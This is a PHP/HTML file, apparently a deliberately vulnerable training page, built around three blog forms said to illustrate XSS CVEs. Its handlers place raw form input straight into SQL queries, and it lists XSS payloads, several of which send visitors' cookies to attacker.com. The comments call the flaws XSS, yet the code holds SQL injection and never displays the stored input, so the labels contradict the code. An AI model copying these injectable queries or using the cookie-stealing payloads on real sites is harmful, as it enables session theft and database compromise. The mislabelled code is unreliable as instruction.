<?php
// CVE-2021-41753: XSS in Blog Comments
// CVE-2021-41754: XSS in Blog Categories
// CVE-2021-41755: XSS in Blog Tags

// Intentionally vulnerable comment handling
function add_comment($post_id, $author, $content) {
    global $conn;
    // Vulnerable SQL query with direct output
    $query = "INSERT INTO comments (post_id, author, content, created_at) 
              VALUES ($post_id, '$author', '$content', NOW())";
    return mysqli_query($conn, $query);
}

// Intentionally vulnerable category handling
function add_category($name, $description) {
    global $conn;
    // Vulnerable SQL query with direct output
    $query = "INSERT INTO blog_categories (name, description) 
              VALUES ('$name', '$description')";
    return mysqli_query($conn, $query);
}

// Intentionally vulnerable tag handling
function add_tag($post_id, $tag) {
    global $conn;
    // Vulnerable SQL query with direct output
    $query = "UPDATE posts SET tags = CONCAT(tags, ',$tag') WHERE id = $post_id";
    return mysqli_query($conn, $query);
}

// Process form submissions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['action'])) {
        switch ($_POST['action']) {
            case 'add_comment':
                // Intentionally vulnerable - direct output
                add_comment($_POST['post_id'], $_POST['author'], $_POST['content']);
                break;
            case 'add_category':
                // Intentionally vulnerable - direct output
                add_category($_POST['name'], $_POST['description']);
                break;
            case 'add_tag':
                // Intentionally vulnerable - direct output
                add_tag($_POST['post_id'], $_POST['tag']);
                break;
        }
    }
}

// XSS Examples for Blog System
$xss_examples = [
    'comments' => [
        '<script>alert("Comment XSS")</script>',
        '<img src=x onerror="fetch(\'http://attacker.com/steal?cookie=\'+document.cookie)">',
        '<svg onload=alert("SVG XSS")></svg>',
        '<body onload=alert("Body XSS")>',
        '<input autofocus onfocus=alert("Input XSS")>',
        '<details open ontoggle=alert("Details XSS")>',
        '<marquee onstart=alert("Marquee XSS")>',
        '<video src onloadstart=alert("Video XSS")>',
        '<audio src onloadstart=alert("Audio XSS")>',
        '<embed src onload=alert("Embed XSS")>',
        '<object data onload=alert("Object XSS")>',
        '<iframe src="javascript:alert(\'Iframe XSS\')"></iframe>',
        '<script>new Image().src="http://attacker.com/"+document.cookie;</script>',
        '<script>fetch("http://attacker.com",{method:"POST",body:document.cookie})</script>',
        '<script>var xhr=new XMLHttpRequest();xhr.open("POST","http://attacker.com",true);xhr.send(document.cookie);</script>'
    ],
    'categories' => [
        '<script>alert("Category XSS")</script>',
        '<img src=x onerror="fetch(\'http://attacker.com/steal?cookie=\'+document.cookie)">',
        '<svg onload=alert("SVG XSS")></svg>',
        '<body onload=alert("Body XSS")>',
        '<input autofocus onfocus=alert("Input XSS")>'
    ],
    'tags' => [
        '<script>alert("Tag XSS")</script>',
        '<img src=x onerror="fetch(\'http://attacker.com/steal?cookie=\'+document.cookie)">',
        '<svg onload=alert("SVG XSS")></svg>',
        '<body onload=alert("Body XSS")>',
        '<input autofocus onfocus=alert("Input XSS")>'
    ]
];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog XSS Vulnerabilities - Diaco</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <div class="container mt-5">
        <h1>Blog XSS Vulnerabilities</h1>
        
        <div class="alert alert-warning">
            <strong>Warning:</strong> This page contains intentional XSS vulnerabilities for educational purposes.
            Do not use these techniques on real websites without permission.
        </div>

        <!-- Comment Form -->
        <div class="card mb-4">
            <div class="card-header">
                <h3>Add Comment</h3>
            </div>
            <div class="card-body">
                <form method="POST">
                    <input type="hidden" name="action" value="add_comment">
                    <input type="hidden" name="post_id" value="1">
                    <div class="mb-3">
                        <label for="author" class="form-label">Your Name</label>
                        <input type="text" class="form-control" id="author" name="author" required>
                    </div>
                    <div class="mb-3">
                        <label for="content" class="form-label">Your Comment</label>
                        <textarea class="form-control" id="content" name="content" rows="3" required></textarea>
                    </div>
                    <button type="submit" class="btn btn-primary">Post Comment</button>
                </form>
            </div>
        </div>

        <!-- Category Form -->
        <div class="card mb-4">
            <div class="card-header">
                <h3>Add Category</h3>
            </div>
            <div class="card-body">
                <form method="POST">
                    <input type="hidden" name="action" value="add_category">
                    <div class="mb-3">
                        <label for="name" class="form-label">Category Name</label>
                        <input type="text" class="form-control" id="name" name="name" required>
                    </div>
                    <div class="mb-3">
                        <label for="description" class="form-label">Description</label>
                        <textarea class="form-control" id="description" name="description" rows="3" required></textarea>
                    </div>
                    <button type="submit" class="btn btn-primary">Add Category</button>
                </form>
            </div>
        </div>

        <!-- Tag Form -->
        <div class="card mb-4">
            <div class="card-header">
                <h3>Add Tag</h3>
            </div>
            <div class="card-body">
                <form method="POST">
                    <input type="hidden" name="action" value="add_tag">
                    <input type="hidden" name="post_id" value="1">
                    <div class="mb-3">
                        <label for="tag" class="form-label">Tag Name</label>
                        <input type="text" class="form-control" id="tag" name="tag" required>
                    </div>
                    <button type="submit" class="btn btn-primary">Add Tag</button>
                </form>
            </div>
        </div>

        <!-- XSS Examples -->
        <div class="card">
            <div class="card-header">
                <h3>XSS Examples</h3>
            </div>
            <div class="card-body">
                <h4>Comment XSS</h4>
                <ul>
                    <?php foreach ($xss_examples['comments'] as $example): ?>
                        <li><code><?php echo htmlspecialchars($example); ?></code></li>
                    <?php endforeach; ?>
                </ul>

                <h4>Category XSS</h4>
                <ul>
                    <?php foreach ($xss_examples['categories'] as $example): ?>
                        <li><code><?php echo htmlspecialchars($example); ?></code></li>
                    <?php endforeach; ?>
                </ul>

                <h4>Tag XSS</h4>
                <ul>
                    <?php foreach ($xss_examples['tags'] as $example): ?>
                        <li><code><?php echo htmlspecialchars($example); ?></code></li>
                    <?php endforeach; ?>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html> 